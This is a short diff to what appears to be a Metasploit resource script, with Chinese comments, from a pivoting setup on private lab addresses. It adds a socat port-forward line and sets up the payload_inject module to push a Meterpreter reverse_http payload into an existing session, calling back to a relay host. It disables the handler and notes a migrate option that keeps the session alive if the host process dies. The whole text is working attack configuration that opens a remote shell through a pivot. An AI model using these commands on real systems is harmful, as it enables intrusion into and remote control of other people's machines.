@@ -1,8 +1,10 @@
+# 将192.168.52.143:1236 转发到 192.168.50.161:1236
+# socat TCP4-LISTEN:1236,fork TCP4:192.168.50.161:1236
 use exploit/windows/local/payload_inject
 set payload windows/meterpreter/reverse_http
-set session 4
-set LHOST 192.168.50.161
-set LPORT 80
+set session 2
+set LHOST 192.168.52.143
+set LPORT 1236
 # msf不创建监听
 set DisablePayloadHandler True
 # set PrependMigrate True # 修改其 stager 以在利用后立即迁移到另一个进程, 如果被程序崩溃或关闭，会话继续存在。
